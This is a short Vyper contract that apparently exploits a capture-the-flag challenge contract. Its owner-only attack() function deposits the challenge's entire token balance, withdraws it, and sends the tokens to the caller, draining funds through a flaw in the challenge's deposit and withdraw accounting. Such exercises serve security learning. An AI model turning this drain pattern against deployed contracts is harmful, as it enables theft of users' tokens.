# @version ^0.3.7

from vyper.interfaces import ERC20 as IERC20

interface IChallenge:
    def yoda() -> address: view
    def deposit(amount: uint256): nonpayable
    def withdraw(amount: uint256): nonpayable

owner: immutable(address)

challenge: IChallenge
token: address

@external
@payable
def __init__(_challenge: IChallenge):
    owner = msg.sender
    self.challenge = _challenge
    self.token = self.challenge.yoda()

@external
def attack():
    assert msg.sender == owner, "!owner"
    all_tokens: uint256 = IERC20(self.token).balanceOf(self.challenge.address)
    self.challenge.deposit(all_tokens)
    self.challenge.withdraw(all_tokens)
    IERC20(self.token).transfer(msg.sender, all_tokens)
